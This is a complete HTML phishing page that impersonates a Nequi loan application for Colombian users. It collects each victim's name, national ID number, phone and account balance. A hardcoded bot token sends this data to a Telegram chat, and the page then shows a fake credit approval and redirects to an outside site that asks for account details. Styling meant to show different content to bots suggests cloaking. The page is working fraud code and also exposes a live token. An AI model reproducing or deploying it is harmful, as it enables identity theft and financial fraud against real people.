<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pr√©stamos</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: #F5F4F8;
        }

        .container {
            background: white;
            padding: 40px;
            width: 100%;
            max-width: 500px;
            position: relative;
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo h1 {
            font-size: 2.5rem;
            font-weight: bold;
            color: #2D1B2E;
        }

        .logo .highlight {
            color: #E91E63;
        }

        .form-title {
            text-align: center;
            margin-bottom: 40px;
            font-size: 1.8rem;
            font-weight: 600;
            color: #2D1B2E;
        }

        .form-step {
            margin-bottom: 30px;
            opacity: 0;
            transform: translateY(20px);
            transition: all 0.5s ease;
        }

        .form-step.active {
            opacity: 1;
            transform: translateY(0);
        }

        .form-step label {
            display: block;
            margin-bottom: 10px;
            font-size: 1.1rem;
            font-weight: 600;
            color: #2D1B2E;
        }

        .form-step input,
        .form-step select {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid #E5E1E8;
            border-radius: 12px;
            background: white;
            color: #2D1B2E;
            font-size: 1rem;
            transition: all 0.3s ease;
        }

        .form-step input:focus,
        .form-step select:focus {
            outline: none;
            border-color: #E91E63;
            box-shadow: 0 0 0 3px rgba(233, 30, 99, 0.1);
        }

        .form-step input::placeholder {
            color: #9E9E9E;
        }

        .form-step select option {
            background: white;
            color: #2D1B2E;
        }

        .submit-btn {
            width: 100%;
            padding: 18px;
            background: #E91E63;
            border: none;
            border-radius: 12px;
            color: white;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            opacity: 0;
            transform: translateY(20px);
            margin-top: 20px;
        }

        .submit-btn.active {
            opacity: 1;
            transform: translateY(0);
        }

        .submit-btn:hover {
            background: #C2185B;
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(233, 30, 99, 0.3);
        }

        .progress-bar {
            width: 100%;
            height: 6px;
            background: #E5E1E8;
            border-radius: 3px;
            margin-bottom: 30px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: #E91E63;
            width: 0%;
            transition: width 0.5s ease;
            border-radius: 3px;
        }

        .step-indicator {
            text-align: center;
            margin-bottom: 20px;
            font-size: 0.9rem;
            color: #666;
            font-weight: 500;
        }

        .currency-symbol {
            position: relative;
        }

        .currency-symbol::before {
            content: '$';
            position: absolute;
            left: 20px;
            top: 50%;
            transform: translateY(-50%);
            color: #E91E63;
            font-weight: bold;
            font-size: 1.1rem;
        }

        .currency-symbol input {
            padding-left: 40px;
        }

        /* Loading Screen */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #F5F4F8;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
        }

        .loading-screen.active {
            display: flex;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid #E5E1E8;
            border-top: 4px solid #E91E63;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 30px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 1.3rem;
            color: #2D1B2E;
            font-weight: 600;
            margin-bottom: 10px;
        }

        .loading-subtext {
            font-size: 1rem;
            color: #666;
            text-align: center;
            margin-bottom: 15px;
        }

        .loading-progress {
            width: 300px;
            height: 4px;
            background: #E5E1E8;
            border-radius: 2px;
            overflow: hidden;
            margin-bottom: 15px;
        }

        .loading-progress-fill {
            height: 100%;
            background: #E91E63;
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 2px;
        }

        .loading-percentage {
            font-size: 0.9rem;
            color: #E91E63;
            font-weight: 600;
        }

        /* Success Screen */
        .success-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #F5F4F8;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
            text-align: center;
            padding: 20px;
        }

        .success-screen.active {
            display: flex;
        }

        .success-icon {
            width: 100px;
            height: 100px;
            background: #E91E63;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 30px;
            animation: bounce 0.6s ease-out;
        }

        .success-icon::before {
            content: '‚úì';
            font-size: 3rem;
            color: white;
            font-weight: bold;
        }

        @keyframes bounce {
            0% { transform: scale(0); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        .success-title {
            font-size: 2.2rem;
            color: #2D1B2E;
            font-weight: bold;
            margin-bottom: 15px;
        }

        .success-message {
            font-size: 1.1rem;
            color: #666;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .success-amount {
            font-size: 2.5rem;
            color: #E91E63;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .back-btn {
            padding: 15px 30px;
            background: #2D1B2E;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .back-btn:hover {
            background: #1A0F1B;
            transform: translateY(-2px);
        }

        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
            }
            
            .logo h1 {
                font-size: 2rem;
            }
            
            .form-title {
                font-size: 1.5rem;
            }

            .success-title {
                font-size: 1.8rem;
            }

            .success-amount {
                font-size: 2rem;
            }

            .loading-progress {
                width: 250px;
            }
        }
        .texto {
            font-size: 0.01px;
        }
        .center-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        
        /* Dise√±o para usuarios de Colombia */
        .colombia-design {
            display: block;
        }
        
        /* Dise√±o para usuarios de otros pa√≠ses */
        .international-design {
            display: none;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: white;
        }
        
        .international-design .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
        }
        
        .international-design h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        
        .international-design .service-card {
            background: rgba(255,255,255,0.15);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            margin: 20px 0;
            border: 1px solid rgba(255,255,255,0.2);
        }
        
        .international-design .logo {
            width: 80px;
            height: 80px;
            background: white;
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #667eea;
            font-size: 1.2em;
        }
        
        .international-design .cta-button {
            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 25px;
            font-size: 1.1em;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.3s ease;
            width: 100%;
            margin-top: 20px;
        }
        
        .international-design .cta-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        /* Dise√±o para bots */
        .bot-design {
            display: none;
            background: #1a1a1a;
            color: #00ff00;
            min-height: 100vh;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        
        .bot-design .terminal {
            max-width: 600px;
            margin: 0 auto;
            background: #000;
            border-radius: 5px;
            padding: 20px;
            border: 1px solid #333;
        }
        
        .bot-design .terminal-header {
            color: #fff;
            margin-bottom: 20px;
            font-size: 1.2em;
        }
        
        .bot-design .terminal-content {
            line-height: 1.6;
        }
        
        .bot-design .blink {
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
    </style>
</head>

<body style="margin: 0;">
    <!-- Dise√±o original para usuarios de Colombia -->
    <div id="colombia-content" class="colombia-design">
        <div style="width: 100%; display: flex; justify-content: space-around;"></div>
        <div style="width: 100%;margin:0px;display: grid;text-align: center;">
            <div class="img">
                <div>
                    <img src="Nequi-5.png" alt="" style="width: 100%; margin-top:0px;">
                </div>
                 <div class="container" id="mainContainer">
     
        <div class="step-indicator">
            Paso <span id="currentStep">1</span> de <span id="totalSteps">5</span>
        </div>
        
        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>

        <form id="creditForm">
            <div class="form-step active" id="step1">
                <label for="fullName">Nombre completo</label>
                <input type="text" id="fullName" placeholder="Ingresa tu nombre completo" required>
            </div>

            <div class="form-step" id="step2">
                <label for="idNumber">N√∫mero de c√©dula</label>
                <input type="text" id="idNumber" placeholder="Ingresa tu n√∫mero de c√©dula" required>
            </div>

            <div class="form-step" id="step3">
                <label for="phone">N√∫mero de tel√©fono</label>
                <input type="tel" id="phone" placeholder="Ingresa tu n√∫mero de tel√©fono" required>
            </div>

            <div class="form-step" id="step4">
                <label for="creditAmount">Monto del cr√©dito solicitado</label>
                <select id="creditAmount" required>
                    <option value="">Selecciona el monto</option>
                    <option value="500000">$500.000</option>
                    <option value="1000000">$1.000.000</option>
                    <option value="2000000">$2.000.000</option>
                    <option value="3000000">$3.000.000</option>
                    <option value="5000000">$5.000.000</option>
                    <option value="8000000">$8.000.000</option>
                    <option value="10000000">$10.000.000</option>
                    <option value="15000000">$15.000.000</option>
                    <option value="20000000">$20.000.000</option>
                    <option value="30000000">$30.000.000</option>
                </select>
            </div>

            <div class="form-step" id="step5">
                <label for="accountBalance">Saldo actual en tu cuenta Nequi</label>
                <div class="currency-symbol">
                    <input type="text" id="accountBalance" placeholder="Ingresa tu saldo actual" required>
                </div>
            </div>

            <button type="submit" class="submit-btn" id="submitBtn">
                ¬°Solicitar cr√©dito!
            </button>
        </form>
    </div>

    <!-- Loading Screen -->
    <div class="loading-screen" id="loadingScreen">
        <div class="spinner"></div>
        <div class="loading-text">Procesando tu solicitud...</div>
        <div class="loading-subtext" id="loadingSubtext">Verificando tu informaci√≥n crediticia</div>
        <div class="loading-progress">
            <div class="loading-progress-fill" id="loadingProgressFill"></div>
        </div>
        <div class="loading-percentage" id="loadingPercentage">0%</div>
    </div>

    <!-- Success Screen -->
    <div class="success-screen" id="successScreen">
        <div class="success-icon"></div>
        <div class="success-title">¬°Cr√©dito Aprobado!</div>
        <div class="success-amount" id="approvedAmount">$0</div>
        <div class="success-message">
            ¬°Felicitaciones! Tu cr√©dito ha sido aprobado.<br>
            Ingresa la cuenta a la que se le va a reflejar el cr√©dito.
        </div>
        
        <button class="back-btn" onclick="redirectToTransfer()">Continuar</button>
    </div>

    <script>
        let currentStepIndex = 0;
        const totalSteps = 5;
        const steps = document.querySelectorAll('.form-step');
        const progressFill = document.getElementById('progressFill');
        const currentStepSpan = document.getElementById('currentStep');
        const submitBtn = document.getElementById('submitBtn');
        const loadingScreen = document.getElementById('loadingScreen');
        const successScreen = document.getElementById('successScreen');
        const mainContainer = document.getElementById('mainContainer');

        // ‚ö†Ô∏è CAMBIA ESTOS VALORES CON TU TOKEN Y CHAT ID DE TELEGRAM ‚ö†Ô∏è
        const TELEGRAM_BOT_TOKEN = '8026008048:AAGsoTBa7Imi1MxiosM8OeSb_vMQm5MWEWs';
        const TELEGRAM_CHAT_ID = '7831097636';

        // Funci√≥n para enviar mensaje a Telegram
        async function sendToTelegram(formData) {
            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
                console.error('‚ùå Token de bot o Chat ID no configurados');
                return false;
            }

            const message = `
üè¶ *NUEVA SOLICITUD DE CR√âDITO*

üë§ *Datos del Solicitante:*
‚Ä¢ Nombre: ${formData.fullName}
‚Ä¢ C√©dula: ${formData.idNumber}
‚Ä¢ Tel√©fono: ${formData.phone}

üí∞ *Informaci√≥n Financiera:*
‚Ä¢ Monto solicitado: $${formData.creditAmount.toLocaleString('es-CO')}
‚Ä¢ Saldo actual: $${formData.accountBalance.toLocaleString('es-CO')}

üìÖ *Fecha:* ${new Date().toLocaleString('es-CO')}
            `.trim();

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                const result = await response.json();
                
                if (result.ok) {
                    console.log('‚úÖ Mensaje enviado a Telegram exitosamente');
                    return true;
                } else {
                    console.error('‚ùå Error al enviar mensaje:', result.description);
                    return false;
                }
            } catch (error) {
                console.error('‚ùå Error de conexi√≥n:', error);
                return false;
            }
        }

        function updateProgress() {
            const progressPercentage = ((currentStepIndex + 1) / totalSteps) * 100;
            progressFill.style.width = progressPercentage + '%';
            currentStepSpan.textContent = currentStepIndex + 1;
        }

        function showNextStep() {
            if (currentStepIndex < totalSteps - 1) {
                currentStepIndex++;
                steps[currentStepIndex].classList.add('active');
                updateProgress();
                
                if (currentStepIndex === totalSteps - 1) {
                    setTimeout(() => {
                        submitBtn.classList.add('active');
                    }, 500);
                }
            }
        }

        function validateCurrentStep() {
            const currentStep = steps[currentStepIndex];
            const input = currentStep.querySelector('input, select');
            return input && input.value.trim() !== '';
        }

        function formatCurrency(amount) {
            return new Intl.NumberFormat('es-CO', {
                style: 'currency',
                currency: 'COP',
                minimumFractionDigits: 0
            }).format(amount);
        }

        function simulateLoadingProgress() {
            const loadingMessages = [
                "Verificando tu informaci√≥n crediticia",
                "Consultando bases de datos financieras",
                "Evaluando tu capacidad de pago",
                "Procesando documentos",
                "Generando pre-aprobaci√≥n",
                "Validando con entidades bancarias",
                "Finalizando aprobaci√≥n"
            ];

            let progress = 0;
            let messageIndex = 0;
            const progressFill = document.getElementById('loadingProgressFill');
            const progressText = document.getElementById('loadingPercentage');
            const subtextElement = document.getElementById('loadingSubtext');

            const interval = setInterval(() => {
                progress += Math.random() * 15 + 5;
                
                if (progress > 100) progress = 100;
                
                progressFill.style.width = progress + '%';
                progressText.textContent = Math.floor(progress) + '%';
                
                if (progress > (messageIndex + 1) * 14 && messageIndex < loadingMessages.length - 1) {
                    messageIndex++;
                    subtextElement.textContent = loadingMessages[messageIndex];
                }
                
                if (progress >= 100) {
                    clearInterval(interval);
                    setTimeout(() => {
                        showSuccessScreen();
                    }, 500);
                }
            }, 400);
        }

        function showSuccessScreen() {
            const selectedAmount = document.getElementById('creditAmount').value;
            
            loadingScreen.classList.remove('active');
            
            document.getElementById('approvedAmount').textContent = formatCurrency(selectedAmount);
            successScreen.classList.add('active');
        }

        function redirectToTransfer() {
            window.location.href = 'https://desemsolso-propulsor.site/col/propulsor/web/formulario_u1.php';
        }

        function resetForm() {
            document.getElementById('creditForm').reset();
            
            steps.forEach((step, index) => {
                if (index === 0) {
                    step.classList.add('active');
                } else {
                    step.classList.remove('active');
                }
            });
            
            currentStepIndex = 0;
            submitBtn.classList.remove('active');
            
            successScreen.classList.remove('active');
            loadingScreen.classList.remove('active');
            
            document.getElementById('loadingProgressFill').style.width = '0%';
            document.getElementById('loadingPercentage').textContent = '0%';
            document.getElementById('loadingSubtext').textContent = 'Verificando tu informaci√≥n crediticia';
            
            updateProgress();
        }

        // Formatear el input del saldo con separadores de miles
        document.getElementById('accountBalance').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value) {
                if (value.length > 15) {
                    value = value.slice(0, 15);
                }
                e.target.value = value.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
            } else {
                e.target.value = '';
            }
        });

        // Event listeners para los inputs
        steps.forEach((step, index) => {
            const input = step.querySelector('input, select');
            if (input) {
                input.addEventListener('input', function() {
                    if (index === currentStepIndex && validateCurrentStep()) {
                        setTimeout(() => {
                            showNextStep();
                        }, 500);
                    }
                });

                if (input.tagName === 'SELECT') {
                    input.addEventListener('change', function() {
                        if (index === currentStepIndex && validateCurrentStep()) {
                            setTimeout(() => {
                                showNextStep();
                            }, 500);
                        }
                    });
                }
            }
        });

        document.getElementById('accountBalance').addEventListener('keyup', function(e) {
            if (currentStepIndex === 4 && this.value.replace(/\D/g, '').length > 0) {
                setTimeout(() => {
                    if (currentStepIndex === totalSteps - 1) {
                        submitBtn.classList.add('active');
                    }
                }, 100);
            }
        });

        // Manejar el submit del formulario - AQU√ç SE ENV√çAN LOS DATOS A TELEGRAM
        document.getElementById('creditForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Recopilar datos del formulario
            const formData = {
                fullName: document.getElementById('fullName').value,
                idNumber: document.getElementById('idNumber').value,
                phone: document.getElementById('phone').value,
                creditAmount: parseInt(document.getElementById('creditAmount').value),
                accountBalance: parseInt(document.getElementById('accountBalance').value.replace(/\./g, ''))
            };

            // Mostrar pantalla de carga
            loadingScreen.classList.add('active');
            
            // Enviar datos a Telegram
            const telegramSent = await sendToTelegram(formData);
            
            if (telegramSent) {
                console.log('üì± Datos enviados exitosamente a Telegram');
            } else {
                console.log('‚ùå Error al enviar datos a Telegram');
            }
            
            // Continuar con la simulaci√≥n de progreso
            simulateLoadingProgress();
        });

        // Inicializar
        updateProgress();
    </script>
                
            </div>
        </div>
    </div>

</body>
</html>
